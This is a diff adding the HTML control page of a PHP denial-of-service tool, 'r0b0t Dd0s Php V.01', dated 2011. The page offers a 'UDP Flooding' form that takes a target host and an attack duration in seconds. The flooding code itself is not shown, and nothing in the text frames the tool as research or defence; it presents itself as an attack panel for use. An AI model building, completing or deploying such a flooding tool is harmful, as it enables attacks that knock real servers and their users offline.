@@ -1,0 +1,34 @@
+?>#---------------------------------------------------------------#
+#		Powered By r0b0t's					#
+#			   By r0b0t's						  #
+#		 wWw.xrobot.mobi					 #
+#			  V01								#
+#			 r-b0t's							  #
+#			   03/2011							 #
+---------------------------------------------------------------#
+<html>
+<head>
+r0b0t Dd0s Php V.01
+</head>
+<body>
+<center>
+<font color="00FF00">
+<STYLE>
+input{
+background-color: #000000; font-size: 8pt; color: #000000; font-family: Tahoma; border: 1 solid #666666;
+}
+button{
+background-color: #000000; font-size: 8pt; color: #000000; font-family: Tahoma; border: 1 solid #666666;
+}
+body {
+background-color: #000000;
+}
+</style>
+<br><b>UDP Flooding</b><br>
+			<form action=? method=GET>
+			<input type="hidden" name="xrt" value="php">
+			Host: <br><input type=text name=host value=><br>
+			Length (seconds): <br><input type=text name=time value=><br><br>
+			<input type=submit value=Go></form></center>
+</body>
+</html>
